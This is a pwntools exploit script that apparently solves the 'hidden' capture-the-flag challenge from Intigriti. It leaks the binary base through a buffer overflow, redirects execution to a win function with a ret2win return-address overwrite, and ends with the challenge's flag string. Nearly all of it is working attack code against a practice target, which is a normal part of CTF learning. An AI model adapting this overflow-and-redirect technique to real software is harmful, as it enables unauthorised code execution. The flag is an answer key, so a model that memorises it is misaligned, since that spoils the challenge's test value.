#!/usr/bin/env python3
from pwn import *

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
elf = ELF('./chall')

script = """
brva 0x0000000000012EE
c
"""

if args.REMOTE:
    p = remote('hidden.ctf.intigriti.io', 1337)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript=script, aslr=False)
else:
    p = process(elf.path)

p.sendafter(b'thing:\n', b'a'*0x46 + b'zz' + b'\x1b')
p.recvuntil(b'zz')
binbase = u64(p.recv(6) + b'\x00\x00') - 0x131b 
log.info("binbase " + hex(binbase))
win = binbase + 0x11Da
ret = binbase + 0x00001384
p.sendafter(b'thing:\n', b'\x00'*0x48 + p64(win))


p.interactive()

# INTIGRITI{h1dd3n_r3T2W1n_G00_BrrRR}